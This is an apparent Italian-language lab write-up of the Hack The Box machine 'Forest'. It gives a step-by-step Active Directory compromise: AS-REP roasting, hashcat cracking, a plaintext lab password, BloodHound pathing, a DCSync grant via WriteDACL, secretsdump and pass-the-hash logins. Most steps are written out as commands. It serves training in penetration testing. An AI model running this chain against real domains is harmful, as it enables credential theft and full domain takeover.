# FOREST

Associamo l'IP ad un nome host

![echo "10.129.95.210   forest.htb" | sudo tee -a /etc/hosts](./immagini/1-hostname.png)

Con una scansione con nmap troviamo diverse porte aperte, una delle prime porte da testare è la 445. Comunque notiamo dalla porta 389 che questa è una macchina a dominio

![nmap -sVC -vv -oN scan.nmap forest.htb](./immagini/2-scan.png)

Possiamo lanciare enum4linux per enumerare il servizio SMB e troviamo una lista di utenti

![enum4linux -a forest.htb.local](./immagini/3-enum4linux.png)

Con questa lista di utenti proviamo un attacco AS-REP Roasting, quindi cerchiamo se qualche utente non richiede pre-auth e possiamo quindi ottenere l'hash della sua password, riusciamo a farlo con l'utente svc-alfresco

![impacket-GetNPUsers htb.local/ -dc-ip forest.htb -no-pass -usersfile users.txt](./immagini/4-impacket.png)

Vediamo che l'hash è in formato krb5asrep, con hashcat cerchiamo a quale mode corrisponde e vediamo che è la 18200

![hashcat -hh](./immagini/5-hashcat-mode.png)

Mettiamo l'hash in un file txt per crackarlo con hashcat con la mode che abbiamo trovato prima, e troviamo al password in chiaro

![echo '<hash>' > hash.txt](./immagini/6-hash-txt.png)
![hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt](./immagini/7-crack-psw.png)

Entriamo con le nuove credenziali nel target con evil-winrm e otteniamo la prima flag

![evil-winrm -i forest.htb -u 'svc-alfresco' -p 's3rvice'](./immagini/8-user-flag.png)

Siccome stiamo parlando di AD, usiamo bloodhound per ottenere tutte le informazioni, da controllare successivamente sulla nostra macchina

![bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -ns 10.129.95.210 -c All](./immagini/9-bloodhound-info.png)

Importiamo tutti i json dentro bloodhound e cerchiamo un path per diventare domain admin partendo dall'utente svc-alfresco. Il nostro utente, grazie all'ereditarietà a tutti i privilegi del gruppo account operators, il quale ha il pieno controllo (generic all) sul gruppo exchange windows permissions. Questo gruppo può modificare tutti i permessi (writeDACL) sull'intero dominio, il quale contiene l'OU users che contiene domain admins

![](./immagini/10-bloodhound-path.png)

Inziamo col caricare powerview.ps1 sul target e mettiamo le nostre credenziali dentro la variabile $cred. Visto che abbiamo il pieno controllo su exchange windows permissions, aggiungiamoci al gruppo in modo da avere tutti i suoi privilegi, cioè modificare le ACL e assegnamoci il diritto DCSync, il quale ci permette di farci dare tutte le informazioni sugli utenti dal DC, tra cui gli hash delle password

![](./immagini/11-write-ACL.png)

Ora con impacket possiamo ottenere l'hash della password di administrator

![impacket-secretsdump htb.local/svc-alfresco:s3rvice@forest.htb  -just-dc-user Administrator](./immagini/12-get-hash.png)

Sfruttiamo questo hash per entrare con evil-winrm come administrator e otteniamo l'ultima flag

![evil-winrm -i forest.htb -u administrator -F '<hash>'](./immagini/13-root-flag.png)